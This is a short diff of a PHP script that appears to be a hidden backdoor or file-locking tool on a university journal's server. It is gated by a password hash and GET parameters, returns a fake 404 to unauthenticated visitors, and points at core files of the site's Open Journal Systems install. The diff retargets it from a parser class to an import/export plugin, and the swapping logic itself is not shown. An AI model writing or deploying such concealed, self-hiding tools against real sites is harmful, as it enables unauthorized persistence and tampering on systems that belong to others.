@@ -7,8 +7,8 @@
 
 $PASSWORD_HASH = '$2a$12$FO.t.v/pScf7TshzRUPvIOx4KaevFZt19M5I3m8Rrg4XyFem6a/xq'; // GANTI
 
-$originalFile = "/home/univgres/journal.univgresik.ac.id/lib/pkp/classes/core/PKPXMLParser.php";
-$lockedFile   = "/home/univgres/journal.univgresik.ac.id/lib/pkp/classes/core/PKPXMLParser.php-";
+$originalFile = "/home/univgres/journal.univgresik.ac.id/plugins/importexport/native/NativeImportExportPlugin.inc.php";
+$lockedFile   = "/home/univgres/journal.univgresik.ac.id/plugins/importexport/native/NativeImportExportPlugin.inc.php-";
 
 if (!isset($_GET['key']) || !isset($_GET['mode']) || !password_verify($_GET['key'], $PASSWORD_HASH)) {
     http_response_code(404);
